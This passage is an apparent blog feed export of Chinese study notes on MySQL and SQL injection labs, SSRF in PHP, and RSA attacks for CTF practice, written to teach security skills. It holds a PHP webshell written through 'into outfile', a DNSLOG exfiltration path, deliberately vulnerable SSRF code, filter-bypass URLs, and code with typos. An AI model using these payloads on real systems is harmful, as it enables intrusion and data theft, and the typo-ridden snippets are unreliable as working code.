href="https://wws.lanzous.com/iqbvnlh1ina%E5%AF%86%E7%A0%81:2hdi%EF%BC%88%E4%BB%A5Edge%E4%B8%BA%E4%BE%8B%EF%BC%89%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90%E8%A7%A3%E5%8E%8B%E5%90%8E%EF%BC%8C%E6%89%93%E5%BC%80%E5%8F%B3%E4%B8%8A%E8%A7%92%E4%B8%89%E4%B8%AA%E7%82%B9%E9%80%89%E6%8B%A9%E6%89%A9%E5%B1%95%E4%B8%AD%E7%9A%84%E5%BC%80%E5%8F%91%E8%80%85%E6%A8%A1%E5%BC%8F%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8A%A0%E8%BD%BD%E8%A7%A3%E5%8E%8B%E7%9A%84hackbar%E6%96%87%E4%BB%B6%E3%80%82">https://wws.lanzous.com/iqbvnlh1ina密码:2hdi（以Edge为例）下载完成解压后，打开右上角三个点选择扩展中的开发者模式，然后加载解压的hackbar文件。</a></p></li></ol><p><strong>可学习博客：</strong><a href="https://www.mrkaixin.top/">https://www.mrkaixin.top/</a></p><h4 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h4><p><u>简单理解Mysql结构</u>：一个数据库里有若干个表，表里面有若干条信息，信息是根据字段来存储的</p><p><strong>Mysql基础操作：</strong>（在命令窗口中执行）</p><p>获得纯净的mysql：dmysql（d ps–&gt;dmysql–&gt;d ps–&gt;de19–&gt;#ls)；</p><p>登录数据库：mysql -uroot -p；</p><p>查看库名/当前数据库有哪些：show databases命令（自带数据库：==information_schema==、mysql、performance_schema、sys）；</p><p>创建库：create database  新建数据库名称；</p><p>删除库：drop database 所删数据库名称；</p><p>使用库/数据库切换：use 所调用数据库名称；</p><p><strong>Mysql表的一些基本操作：</strong></p><p>创建表格：create table 表格名称(元素）；查看表格结构：desc 表格名称；例如：</p><img src="/images/%E7%AC%AC%E4%B9%9D%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210811230738987.png" alt="image-20210811230738987" style="zoom: 67%;" /><p>增删改查语句：（对应上图）</p><ol><li>Insert :<br>insert into 数据库 values(‘id’, ‘name’ );（注：id和name不是固定的，是因为我们上图创建的表格元素为id和name，一一对应）</li><li>Delete :<br>delete from 数据库 where xxxx;（注：若无where xxx则默认删除表格全部数据）</li><li>Update :<br>update 数据库 set name =‘x’ where id = 3;</li><li>Select :（可用于查看表格内容）<br>select * from 数据库;（注：*可输出表格全部字段，如果用命令“select 元素 from 数据库”则只输出该元素下的数据）</li></ol><p><strong>Mysql常用的变量（函数）：</strong></p><ol><li>Database() //查看当前数据库名——&gt;select database()可获取当前数据库名</li><li>User() //用户——&gt;select user()可获取当前用户名</li><li>Version() // mysql 版本——&gt;select version()可获取当前mysql的版本</li><li>@@basedir //安装路径——&gt;select @@basedir可获取mysql的安装路径</li></ol><p><strong>Mysql常用的符号：</strong></p><p>逻辑运算符：&amp;（and）、||（or）、^（xor异或）</p><p><strong>Mysql常用的函数：</strong></p><ol><li>字符串截取函数<br>●Substr(database(),1,1)<br>●Subtring<br>●Mid(database(),1,1)<br>●Left(database() ,1)</li><li>编码函数<br>●Ascii()<br>●Hex()<br>●Char() // ascii()的逆函数</li><li>文件函数<br>●Load_ file() //读取文件内容</li></ol><h4 id="搭建SQLI-Labs"><a href="#搭建SQLI-Labs" class="headerlink" title="搭建SQLI-Labs"></a>搭建SQLI-Labs</h4><ol><li><p>获取源码：</p><p>地址：<a href="http://github.com/Rinkish/Sqli_Edited_Version">http://github.com/Rinkish/Sqli_Edited_Version</a></p><p>使用：git clone <a href="http://github.com/Rinkish/Sqli_Edited_Version%E6%88%96%E7%82%B9%E5%87%BB%E4%B8%8B%E8%BD%BD%E9%83%BD%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%9A%84%E3%80%82">http://github.com/Rinkish/Sqli_Edited_Version或点击下载都是可以的。</a></p><img src="/images/%E7%AC%AC%E4%B9%9D%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210813232801257.png" alt="image-20210813232801257" style="zoom: 25%;" /><p>在命令窗口输入d run -p 30001:80 -d acgpiano/sqli-labs进行一键搭建</p></li><li><p>搭建：按图中顺序进行操作</p><img src="/images/%E7%AC%AC%E4%B9%9D%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210813233538184.png" alt="image-20210813233538184" style="zoom:50%;" /><p>完成后可尝试阿帕奇和myaql等套件来启动环境</p><p>在刚才的下载的解压文件夹中找到sql-connections修改db-creds.inc（sqli-libs的配置信息）中的用户名和密码即可</p></li><li><p>初始化数据库</p><p> 可以输入localhost或本地ip地址进行访问</p><p>使用数据库之前点击setup/reset database for labs进行初始化</p><p><u>注：推荐学习dockrt的教程：</u></p><p><a href="https://yeasy.gitbooks.io/docker_practice/container/daemon.html">https://yeasy.gitbooks.io/docker_practice/container/daemon.html</a></p></li></ol><h4 id="sql基本介绍"><a href="#sql基本介绍" class="headerlink" title="sql基本介绍"></a>sql基本介绍</h4><p>小知识：</p><p>定义：</p><p>SQL注入是对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾，添加额外的SQL语句。（简记：在事先定义好的查询语句中添加SQL语句使之使成为攻击者的）</p><p>SQL注入的危害：</p><p>●数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>●网页篡改：通过操作数据库对特定网页进行篡改。<br>●数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>●服务器被远程控制：被安装后门。</p><ol><li>联合查询</li><li>报错注入</li><li>盲注:时间盲注，布尔盲注</li><li>堆叠注入</li><li>读写文件</li></ol><p>一个简单的小栗子：</p><p>select * from 表名 where 1=1;//因为1=1永远为真故此命令相当于选中该数据库的所有内容即select * form 数据库。而where id=id为空集。</p><h4 id="Mysql文件读写"><a href="#Mysql文件读写" class="headerlink" title="Mysql文件读写"></a>Mysql文件读写</h4><p>mysql不支持文件读写这么敏感的操作，因此需要更改secure-file-priv=中的配置项以进行操作。</p><p><strong>步骤：</strong></p><p>phpstudy–设置–配置文件–mysql–在max_connection=100下面加上secure-file-priv=语句–重启配置</p><img src="/images/%E7%AC%AC%E4%B9%9D%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210816231657516.png" alt="image-20210816231657516" style="zoom:50%;" /><p><strong>写文件：</strong></p><p> 写文件的条件：</p><ol><li>设置secure-file-priv为Null</li><li>绝对路径</li><li>文件不存在</li><li>有权限</li></ol><p>写shell：</p><p>如果知道WEB服务器的路径就可以写入shell，条件与写文件的同。</p><p>写文件函数:<br>●into outfile<br>●into dumpfile<br><code>select &#39; &lt;?php eval ($_POST[cmd]); ?&gt;&#39;into outrile &#39;绝对路径&#39; ;</code><br><u>两个函数的区别在于</u>：<br>因为into outfile函数会在行末端写入新行更致命的是会转义换行符，所以如果处利用mysql写一些d11或者其他二进制可执行文件，那么这个义件可能会被破坏<br>这时候我们用into dumpfile 就能导出一个完 整能执行的二进制文件</p><p><strong>读文件：</strong></p><p>文件读取函数：</p><p>●Load_file(‘文件路径’)</p><p><strong>读文件–DNSLOG：</strong></p><p>DNSLOG外带条件：</p><ol><li>设置secure-file-priv为Null</li><li>目标为windows</li></ol><p>原理：<br><img src="/images/%E7%AC%AC%E4%B9%9D%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210816234702764.png" alt="image-20210816234702764"></p><p>小知识：</p><p><a href="http://dnslog.cn/%E4%B8%80%E4%B8%AA%E5%85%AC%E7%94%A8%E7%9A%84DNSLOG%E5%B9%B3%E5%8F%B0">http://dnslog.cn/一个公用的DNSLOG平台</a></p><p>什么是UNC路径?<br>UNC路径就是类似\softer这样的形式的网络路径。（故dnslog只存在于windows中）<br>格式: llservernamelsharename， 其中servername是服务器名。sharename 是共享资源的名称。例如：<code>\\mrkaixin。8q0zrc.dnslog.cn\abc</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第八篇博客</title>
      <link href="/2021/08/03/%E7%AC%AC%E5%85%AB%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/08/03/%E7%AC%AC%E5%85%AB%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB初步学习"><a href="#WEB初步学习" class="headerlink" title="WEB初步学习"></a>WEB初步学习</h2><h3 id="PHP-amp-amp-SSRF"><a href="#PHP-amp-amp-SSRF" class="headerlink" title="PHP &amp;&amp; SSRF"></a>PHP &amp;&amp; SSRF</h3><p>注：还需学习利用SSRF漏洞进行攻击</p><h4 id="前言——渗透测试："><a href="#前言——渗透测试：" class="headerlink" title="前言——渗透测试："></a>前言——渗透测试：</h4><p><strong>定义：</strong></p><p>渗透测试是一种通过模拟使用黑客的技术和方法，挖掘目标系统的安全漏洞，取得系统的控制权，访问系统的机密数据，并发现可能影响业务持续运作安全隐患的一种安全测试和评估方式。<br><u>渗透测试和黑客入侵最大区别在于渗透测试是经过客户授权</u>，采用可控制、非破坏性质的方法和手段发现目标和网络设备中存在弱点，帮助管理者知道自己网络所面临的问题，同时提供安全加固建议，帮助客户提升系统的安全性。</p><p><strong>分类：</strong></p><p><u>黑盒测试</u>：是指测试人员在不清楚被测单位内部技术架构的情况下，从外部对网络设施的安全性进行测试的过程。黑盒测试借助于真实世界的黑客方法，黑客工具，有组织有步骤的对目标系统进行逐步的渗透和入侵，揭示目标系统中一些已知的和未知的安全漏洞，并评估这些漏洞是否可以被不法分子利用，并造成业务和资产损失。<br><u>白盒测试</u>：测试人员可以获取被测单位的网络结构和各种底层技术。在此基础上，使用针对性的测试方法和工具，可以以较小的代价发现和验证系统最严重的安全漏洞。（代码审计必不可少，读懂代码找漏洞）<br>在实际渗透中，两者各有利弊，需要视情况选择和进行，有时还需将两个结合起来使用。</p><h4 id="PHP入门"><a href="#PHP入门" class="headerlink" title="PHP入门"></a>PHP入门</h4><p><strong>定义：</strong></p><p>PHP (全称: PHP: Hypertext Preprocessor，即”PHP：超文本预处理器”)是一种通用开源脚本语言。PHP脚本在服务器上执行。</p><p><strong>PHP集成开发环境：</strong></p><p>windows下可以下载<u>phpstudy</u>（方便切换版本，下载简单）/xampp等<br>mac可以下载mxsrvs, phpstudy for mac，docker yyds等</p><p><strong>使用phpstudy：</strong></p><p>phpstudy是个集成软件，应该根据所需服务一键启动</p><img src="/images/%E7%AC%AC%E5%85%AB%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210805235017858.png" alt="image-20210805235017858" style="zoom: 33%;" /><p>phpstudy可能会在所在程序目录下新建一个www目录作为web根目录</p><p>尝试代码：保存后可在本地尝试访问一下——&gt;本地IP/对应文件名</p><pre><code class="php">&lt;?php    echo &quot;helloworld !&quot;;?&gt;</code></pre><p><u>注：推荐学习php w3cschool</u></p><p><strong>代码审计时需要关注的点：</strong></p><p>事实上，代码审计也有多种思路：例如可以选择先通读代码，理解结构和功能后再从中发现问题——但这种方式的缺点显而易见：十分耗时且令人头疼，不太适用于代码量大的情况；也可以依据经验寻找易出现问题的关键功能——这往往也可以与黑盒测试相结合，定位<br>功能对应的代码后找到关键函数，正向或反向的追踪其中用到的变量（例如文件下载功能处<br>若未经过滤则可能存在任意文件下载漏洞，发现该功能后定位代码段，找到其使用的功能函<br>数——可能是file_get_contents或者别的什么，追踪它使用的变量是否有做安全过滤)；甚至你可以直接尝试定向的挖掘某一类漏洞——依旧是通过可能涉及的函数去寻找……<br>但无论你使用哪种方法进行漏洞挖掘，阅读代码的能力是必不可少的。也就是，你至少得知道开发者在做什么。</p><h4 id="浅谈SSRF漏洞"><a href="#浅谈SSRF漏洞" class="headerlink" title="浅谈SSRF漏洞"></a>浅谈SSRF漏洞</h4><p><strong>SSRF的定义与成因：</strong></p><p>SSRF(Server-Side Request Forgery：服务器端请求伪造)是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。(正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统)<br>SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容,加载指定地址的图片，下载等等。</p><p><strong>SSRF代码层成因：</strong>（代码审计需观察有无以下类似写法，变量是否未经任何过滤就传到危险函数中）</p><pre><code class="php">//file_get_contents&lt;?php  if(isset($_POST[&#39;url&#39;]))//isset()为判断是否有设置括号中的函数即检测变量是否已设置并且非null    &#123;        $content = file get_contents($_POST[&#39;url&#39;]);//为文件读取的关键函数        $filename = &#39;./images/&#39; .rand().&#39;.jpg&#39;;//字符串拼接        fi1e_put_contents($filename, $content);//将之前读到的数据写进文件中        echo $_POST[&#39;ur1&#39;];        $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;;        echo $img;    &#125;    else    &#123;        echo &quot;no ur1&quot;;      &#125;?&gt;//总的来说是实现图片保存功能</code></pre><p>简化代码：</p><pre><code>&lt;?php  echo file_get_contents($_GET[&#39;url&#39;]);?&gt;</code></pre><p>在浏览器中输入本地ip/文件名?url=<a href="http://www.baidu.com(需要给url赋值,否则会报错)则会打开百度的页面/">http://www.baidu.com（需要给url赋值，否则会报错）则会打开百度的页面</a></p><pre><code class="php">//fsockopen&lt;?php   function GetFile($host,$port,$link) &#123;      $fp = fsockopen($host, intval($port), $errno, $errstr, 30);      if (!$fp)&#123;          echo &quot;serrstr (error number $errno) \n&quot;;      &#125;else &#123;          $out = &quot;GET $link HTTP/1.1irin&quot;;          $out .=&quot;Host: $hostirin&quot;;          $out .= &quot;Connection: closeirinirin&quot;;$out .=&quot;\rin&quot;;          fwrite($fp,$out);          $contents=&#39;&#39;;          while (!feof($fp)) &#123;              $contents.=fgets($fp,1024);           &#125;           fclose($fp);           return $contents;      &#125;   &#125;?&gt;</code></pre><pre><code class="php">//curl&lt;?php    if (isset($_POST[&#39;url&#39;]))&#123;        $1ink = $_POST[&#39;ur1&#39;];        $curlobj = cur1_init();        curl_setopt($curlobj, CURLOPT_POST, 0);        curl_setopt($curlobj, CURLOPT_URL,$link);        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);        $result=curl_exec($curlobj);         curl_close($cur1obj);        $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;        $file_put_contents($filename, $result);        echo $result ;    &#125;?&gt;</code></pre><p><strong>SSRF的危害：</strong></p><p>-内网探测<br>-利用file协议读取本地文件等等<br>-向内部（内网）任意主机的任意端口发送精心构造的Payload，从而攻击内网的应用，主要是使用GET参数就可以实现的攻击(比如struts2，sqli等)<br>-DOS攻击(请求大文件，始终保持连接Keep-Alive Always)</p><p><strong>SSRF漏洞的验证：</strong></p><ol><li>排除法：浏览器f12（或右上角的三个点–更多工具–开发者工具）查看源代码看是否是在本地进行了请求<br>比如:该资源地址类型为 <a href="http://www.xxx.com/a.php?image=">http://www.xxx.com/a.php?image=</a> (地址)的（即对该地址进行请求操作）就可能存在SSRF漏洞（本例可能存在对任意网址请求的漏洞）</li><li>dnslog/requestbin等工具/平台进行测试或监听，看是否被访问。</li></ol><p><u>曾经常考</u>：在网站的根目录下放一个flag.php文件。如下。</p><pre><code class="php">&lt;?php    $flag = &quot;flag&#123;well,You get_ 1t&#125;&quot; ;    if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== $_SERVER[&#39;HTTP_HOST&#39;])&#123;        echo &quot;You are not a local visitor, access is forbidden!&quot; ;    &#125;//该代码意味着只有从本地访问才有可能输出flag        else&#123;        echo $flag;    &#125;?&gt;</code></pre><p>如何访问：<a href="http://x.x.x.x/?url=flag.php%EF%BC%88%E9%80%9A%E8%BF%87%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E6%9D%A5%E6%89%93%E5%BC%80flag.php%E6%96%87%E4%BB%B6%EF%BC%89">http://x.x.x.x/?url=flag.php（通过访问本地来打开flag.php文件）</a></p><p><strong>一些绕过：</strong>（仅提供思路，而非用下面方式一定能绕过。应该依据对方的具体代码以及具体过滤形式选择绕过方式）</p><ol><li><p>加端口.  127.0.0.1:80 </p></li><li><p>短网址</p></li><li><p>指向任意IP的域名xip.io 127.0.1.xip.io</p></li><li><p>IP限制绕过</p><p>十进制转换 (转换成16进制再转换回来，把.换成0，<a href="http://0x7f000001,十进制就是http//2130706433">http://0x7f000001，十进制就是http://2130706433</a> )<br>八进制转换<a href="http://127.0.0.1/">http://0177.0.0.1</a></p><p>十六进制转换<a href="http://127.0.0.1/">http://0x7f.0.0.1</a></p><p>不同进制组合转换</p></li><li><p> @绕过</p></li></ol><p>   <a href="http://www.bai.com@127.0.0.1(实际访问的还是127.0.0.1这个本地)/">http://www.bai.com@127.0.0.1（实际访问的还是127.0.0.1这个本地）</a></p><ol start="6"><li><p>后面跟参数（寻找功能点以发现参数）</p><p> <a href="http://127.0.0.1/?a=sdagwasdwfa">http://127.0.0.1?a=sdagwasdwfa</a></p></li></ol><p><u>小知识</u>：</p><p>完整url：“协议：//用户名：密码@网址/网站文件？参数名=参数值#锚点”</p><p>当内网存在redis/mongodb/mysql等，也可以考虑同ssrf漏洞去进一步攻击</p><p>内网攻击可以采用”gopher://“或”dict://“协议</p><p>内网端口扫描可以用”dict://“或”http://“协议等，使用协议需要根据SSRF是如何造成的来具体分析。（内网扫端口并无特定端口）</p><p>边界机器存在ssrf，通过dict或者http等协议扫本地端口或内网网段（如本地的5000端口上存在一个flaskweb，那么请求127.0.0.1：5000的时候能访问到，内网同理）找到内网web应用后通过http协议访问并尝试攻击，如果要发生post请求可以使用gopher，知道到内网脆弱应用后可以通过gopher协议进行攻击。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第六篇博客</title>
      <link href="/2021/07/24/%E7%AC%AC%E5%85%AD%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/07/24/%E7%AC%AC%E5%85%AD%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="CRYPTO初步学习"><a href="#CRYPTO初步学习" class="headerlink" title="CRYPTO初步学习"></a>CRYPTO初步学习</h2><h3 id="cry-rsa加密与攻击"><a href="#cry-rsa加密与攻击" class="headerlink" title="cry-rsa加密与攻击"></a>cry-rsa加密与攻击</h3><p>注！还需进行理解学习并继续</p><p>学习链接：nep.am473ur.com</p><h4 id="什么是RSA"><a href="#什么是RSA" class="headerlink" title="什么是RSA"></a>什么是RSA</h4><p><strong>小知识：</strong></p><p>RSA是一种非对称加密</p><p>对称密码和非对称密码的区别：如果加密和解密用的是相同的密钥则为对称密码；如果加密和解密用的是不同的密钥，且加密密钥只能加密，解密密钥只能解密则为非对称密码。</p><p>对称密码加解密密钥一样因此均为私钥；而非对称密码加密密钥可以公开则为公钥，揭秘密码为私钥。</p><p>单向函数（简记：单向通行）：对每一个输入x，函数值f（x）都很容易计算；对随机给出的函数值f（x），算出原始输入x却比较困难；使用陷门信息则可以反逆。</p><p>哈希算法只能用于加密，不能用于解密，因为没有陷门信息可以反逆，正常的加密是需要解密的。</p><h4 id="一点点数论基础"><a href="#一点点数论基础" class="headerlink" title="一点点数论基础"></a>一点点数论基础</h4><p><strong>同余：</strong>（简记：余数相同）</p><p>定义：若a，b为两个整数，且它们的差a-b能被某个自然数m所整除，则称a就模m来说同余于b，或者说a和b关于模m同余，记为：a≡b(mod m)。它意味着：a-b=m*k（k为某一个整数）。</p><p>性质：没有同除性</p><p>1.反身性：a≡a (mod m)；</p><p>2.对称性：若a≡b(mod m)，则b≡a (mod m)；</p><p>3.传递性：若a≡b(mod m)，b≡c(mod m)，则a≡c(mod m)；</p><p>4.（1）同余式相加：若a≡b(mod m)，c≡d(mod m)，则a+c≡b+d(mod m)；</p><p>（2）同加性：若a≡b(mod m)，则a+c≡b+c(mod m)</p><p>5.（1）同余式相乘：若a≡b(mod m)，c≡d(mod m)，则a$<em>c≡b</em>$d(mod m)。</p><p>（2）同乘性：若a≡b(mod m)，则a$<em>c≡b</em>$c(mod m)</p><p>6.同幂性：若a≡b(mod m)，则a^n^≡b^n^(mod m)</p><p>7.推论1：a$<em>$b mod k=(a mod k)$</em>$(b mod k)mod k</p><p>8.推论2：若a mod p=x，a mod q=x，p，q互质，则a mod p$*$q=x</p><p><strong>模逆元：</strong>（简记：参考倒数xy=1的定义）</p><p>定义：模逆元也称为模倒数。一整数a对同余n之模逆元是指满足以下公示的整数b：a^-1^≡b(mod n)也可以写成以下的式子：ab≡1(mod n)。整数a对模数n之逆元存在的充分必要条件是a和n互素，若此模逆元存在，在模数n下的除法可以用和对应模逆元的乘法来达成，此概念和实数除法的概念相同。</p><p>代码：</p><p>1.可以使用Python第三方包Crypto的inverse()函数求模逆元。</p><p>from Crypto.util.number import inverse print(inverse(3,7))#3是要求逆元的数，7是模数<br>2.可以使用Python第三方包gmpy2的 invert()函数求模逆元。</p><p>from gmpy2 import invert<br>print(invert(3,7)#3是要求逆元的数，7是模数<br>3.可以在SageMath中直接用inverse_mod()函数求模逆元。</p><p>inverse_mod(3,7)#3是要求逆元的数，7是模数</p><p><strong>欧拉函数：</strong></p><p>Z<del>m</del>内与m互素的整数的个数记为φ（m）</p><p>幸运的是,如果m的因式分解是已知的,则存在一个更简单的计算方法,如下图所示。</p><img src="/images/%E7%AC%AC%E5%85%AD%E7%AF%87%E5%8D%9A%E5%AE%A2/QQ%E5%9B%BE%E7%89%8720210728200205.png" alt="QQ图片20210728200205" style="zoom:50%;" /><p>假设m = 240 , 240因式分解对应的素因数相乘形式为:<br>m= 240= 16·15= 2^4^·3·5<br>φ(m)=2^3^·(2-1)·(3-1)·(5- 1)=8·1·2·4= 64<br>所以想要计算出一个合数的欧拉函数，需要先知道这个数的因式分解，一些大整数的乘积难以被分解的特点也保证了RSA公钥加密的安全性。</p><p><strong>费马小定理：</strong>假如a为一个整数，p为一个素数，则a^p-1^=1 (mod p)</p><p><strong>欧拉定理：</strong>假设a和m都是整数,且gcd(a，m)=1(a与m的最大公约数为1即a与m互素）则有a^φ(m)^ = 1 (mod m)——&gt;比如a=2，m=3，则Z<del>m</del>=0,1,2，其中1，2为Z<del>m</del>内与m互素的整数即φ（m）=2。原式=2^2^≡1(mod 3)</p><p>注：费马小定理是欧拉定理的特殊情况</p><h4 id="RSA是如何加密和解密的"><a href="#RSA是如何加密和解密的" class="headerlink" title="RSA是如何加密和解密的"></a>RSA是如何加密和解密的</h4><p>RSA加密中会出现以下几个参数:</p><p>●两个大的素数p和q，以及它们的积n , n是加解密过程中的模数</p><p>●欧拉函数p(n)=(p-1)*(q-1)</p><p>●加密指数e ,和解密指数d = invert(e, φ(n))</p><p>●密文c,明文m</p><p>●d是e对 φ(n)的逆元即e和d在模 φ(n)的运算下互为倒数</p><p><strong>加密：c=m^e^mod n<br>解密：m=c^d^mod n</strong></p><h4 id="python简单实现RSA算法"><a href="#python简单实现RSA算法" class="headerlink" title="python简单实现RSA算法"></a>python简单实现RSA算法</h4><p><strong>生成随机素数：</strong></p><p>getPrime()函数，括号里的参数意义为位长度，下面示例表示生成一个512bits的随机素数。</p><pre><code class="python">from Crypto.Util.number import *p = getPrime(512)</code></pre><p>getStrongPrime()函数，括号里的参数意义为位长度，生成一个更安全的素数。</p><pre><code class="python">from Crypto.Util.number import *p = getStrongPrime(512)</code></pre><p><strong>计算模逆元的两个函数的区别：</strong></p><p>使用Crypto包里的inverse() 函数,两个参数不互素的时候返回的是除以最大公因数之后的逆元。互素的情况下和gmpy2的invert返回值相同。</p><pre><code class="python">from Crypto. 4til. number import *d = inverse(e, (p-1)*(q-1))</code></pre><p>使用gmpy2包里的invert()函数，两个参数不满足互素时会报错，只有满足互素时正常求逆元。</p><pre><code class="python">from gmpy2 import invertd = invert(e, (p-1)*(q-1))</code></pre><p><strong>判断素数：</strong></p><p>isPrime(可以用来判断素数）</p><pre><code class="python">from Crypto. Util, number import *print(isPrime(7))</code></pre><p>求最大公因数</p><pre><code class="python">from Crypto.Util. number import *print (GQD(12, 18)) # 6</code></pre><p><strong>开n次方根：</strong></p><p>使用gmpy2的iroot函数，可以开n次方根，返回一个数字，一个布尔值。数字表示开根的结果，布尔值表示结果的n次方是否刚好等于原来的数。</p><pre><code class="python">from gmpy2 import irootprint (iroot(4,2)) #表示对4开平方根</code></pre><p><strong>RSA加密：</strong></p><pre><code class="python">from Crypto.Util.number import *m = 123456e = 65537p, q = getPrime(128), getPrime(128) n = p*qC = pow(m, e, n)print(c)#46446567530734328956895050621451855413068614241783489657583370527982913123577</code></pre><p>例子：（理解！）</p><p>现在Alice想要接收Bob的一-串数字123456 ，他们的通信线路是不安全的，可以被攻击者Eve窃听到，所以他们可以使用RSA公钥加密算法，使信息安全的传输。<br>Alice首先需要生成公钥(e, n) ，和不发送的私钥d。Alice 会将(e, n)发送给Bob ：</p><pre><code class="python">from Crypto.Util.number import *e = 65537p, q = getPrime(128), getPrime (128)n = p*qd = inverse(e, (p-1)*(q-1))print(&quot;n =&quot;,n)print(&quot;d =&quot;,d)#n=6411909786146702584131486972338640117238044567019786914226150985552161578#d=34488339696882282190704342167311503848344429551595618555980250777974774475</code></pre><p>现在Bob接收到了Alice 发送的公钥(e, n) ，他使用这组公钥加密自己的明文，并把密文c发送给Alice :</p><pre><code class="python">from Crypto.Util.number import *e = 65537n = 64119097861467025841314869723386401172380445670197869142261509855521615781313m = 123456c = pow(m, e, n)print(&quot;c =&quot; ,c)#C = 35175039627001706475239565374293351303180888840171603334474497768320397005778</code></pre><p>Alice接收到了c，她还有之前生成的解密指数d ，她可以用私钥(d, n)解开密文：</p><pre><code class="python">from Crypto.Util.number import *d = 34488339696882282190704342167311503848344429551595618555980250777974774475073n = 64119097861467025841314869723386401172380445670197869142261509855521615781313C = 351750396270017064752395653742935130318888840171603334474497768320397005778m = pow(c, d, n)print(&quot;m =&quot;，m)#m = 123456</code></pre><p>所以Alice最终得到了Bob的明文，并且他们在这条不安全的通信线路中传递了两次信息，这两次都被Eve成功窃听到。</p><p>那么Eve现在掌握的信息是:<br>●Alice 和Bob在使用RSA公钥加密算法传递信息。<br>●窃听到了Alice发送的e和n。<br>●窃听到了Bob发送的c。<br>Eve想要窃取到明文m ，需要从这三个参数入手。<br>在很多CTF密码学题目中，我们解题就相当于Eve做的事情一攻击加密算法。</p><h4 id="RSA相关的攻击算法"><a href="#RSA相关的攻击算法" class="headerlink" title="RSA相关的攻击算法"></a>RSA相关的攻击算法</h4><p><strong>分解素因数攻击：</strong></p><p>以上面的Alice和Bob泄露的信息为例，开始第一种攻击，我们现在已知的参数：<br>e = 65537<br>n = 64119097861467025841314869723386401172380445670197869142261509855521615781313<br>c = 35175039627001706475239565374293351303180888840171603334474497768320397005778<br>解密需要计算pow(c, d, n) ，所以我们需要知道d ，然而d = invert(e，φ(n)) ，这个式子中我们已知了e和n， invert很好计算,就需要算q(n) ，现在问题是如何计算n的欧拉函数，我们需要知道n的素因数分解。</p><p>n的数值很大，RSA中常用的数量级往往不能通过枚举的方法（试除法）分解因数。但是如果生成的素数是不安全的，有可能导致n很容易被分解。<br>在这一个例子中，我们可以知道n是256位的，这种长度完全是不安全的（通常生成的素数约2048位），所以我们尝试使用一些算法或工具来尝试分解n。<br>整数分解算法：<a href="https://www.alpertran.cam.ar/ECM.HTM">https://www.alpertran.cam.ar/ECM.HTM</a><br>整数因数/数据库查询：<a href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a></p><p>平滑数：因式分解中最大的素因数比它小（？）</p><p><strong>共模攻击：</strong></p><p>如果在 RSA 的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。<br><img src="/images/%E7%AC%AC%E5%85%AD%E7%AF%87%E5%8D%9A%E5%AE%A2/wps1.png" alt="img"> =c<del>1</del>(mod n)，<img src="/images/%E7%AC%AC%E5%85%AD%E7%AF%87%E5%8D%9A%E5%AE%A2/wps2.png" alt="img"> = c<del>2</del>(mod n)<br>通过扩展欧几里德算法，可以计算出:<br>这样就有:<img src="/images/%E7%AC%AC%E5%85%AD%E7%AF%87%E5%8D%9A%E5%AE%A2/wps3.png" alt="img">= m^re1+se2^=m^1^(mod n).<br>但是r和s 中必有一个是负数，所以需要用逆元来处理一下(假设s&lt;0)：<br>m^1^=m^re1+se2^= <img src="/images/%E7%AC%AC%E5%85%AD%E7%AF%87%E5%8D%9A%E5%AE%A2/wps4.png" alt="img">，其中s+即|s|= -s</p><p><strong>已知p+q或p-q：</strong></p><p>或者是题目给了其他的pq之间的关系，通过解方程组或推导来求出p和q。<br>$p<em>q = n<br>p+q = a<br>使用SageMath解方程组：<br>var(‘p q’)<br>solve([p</em>q = = n,p+q = = a],[p, q])$</p><p>也可以用python进行求解，SageMath比较方便简洁。</p><p><strong>小公钥指数攻击：</strong></p><p>当加密指数e很小，比如e = 3时，c可能不比n大很多(在可枚举的范围之内)。<br>这样就存在一个较小的可枚举的 k满足：<br>m^3^=c+k·n<br>尝试枚举k并开根，能刚好开根的就是解。</p><p><strong>已知e，d分解n：</strong></p><p>ed ≡ 1(mod φ(n))</p><p>ed = 1+k·φ(n),k&lt;e</p><p>穷举k，计算出φ(n)</p><p>φ(n) = (p-1)(q-1) = n-(p+q)+1</p><p>解一个二元二次方程组</p><p>p+q = n-φ(n)+1</p><p>p·q = n</p><p><strong>已知明文高位攻击：</strong>……</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第五篇博客</title>
      <link href="/2021/07/24/%E7%AC%AC%E4%BA%94%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/07/24/%E7%AC%AC%E4%BA%94%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
